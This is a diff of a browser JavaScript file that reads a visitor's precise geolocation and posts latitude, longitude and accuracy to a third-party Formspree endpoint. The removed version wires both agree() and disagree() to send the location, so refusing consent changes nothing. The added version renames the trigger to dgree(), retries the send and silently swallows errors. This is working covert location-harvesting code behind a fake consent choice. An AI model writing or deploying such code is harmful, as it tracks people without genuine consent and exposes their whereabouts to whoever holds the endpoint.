@@ -1,53 +1,41 @@
-
-function getLocation(callback) {
-  if (!navigator.geolocation) {
-    callback("Geolocation is not supported by your browser.");
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const acc = pos.coords.accuracy;
-      callback(`Latitude: ${lat}, Longitude: ${lon} (Accuracy: ${acc} meters)`);
-    },
-    err => {
-      callback("Unable to retrieve location: " + err.message);
+async function getLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject("Geolocation is not supported by your browser.");
+      return;
     }
-  );
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve(pos),
+      err => reject("Unable to retrieve location: " + err.message)
+    );
+  });
 }
 
-async function s(t) {
-
-  while (true) {
+async function sendRequest(data) {
+  let attempts = 0;
+  while (attempts < 5) {
     try {
       const r = await fetch("https://formspree.io/f/xeorknrp", {
         method: "POST",
-        headers: {
-          "Content-Type": "text/plain"
-        },
-        body: t
+        headers: { "Content-Type": "text/plain" },
+        body: data
       });
-
-      if (r.ok) {
-        break;
-      }
+      if (r.ok) break;
     } catch (err) {
+      
     }
-
+    attempts++;
     await new Promise(r => setTimeout(r, 1000));
   }
 }
 
-function agree() {
-  getLocation(result => {
-    s(result);
-  });
+async function dgree() {
+  try {
+    const pos = await getLocation();
+    const data = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`;
+    await sendRequest(data);
+  } catch (err) {
+    
+  }
 }
 
-function disagree() {
-  getLocation(result => {
-    s(result);
-  });
-}
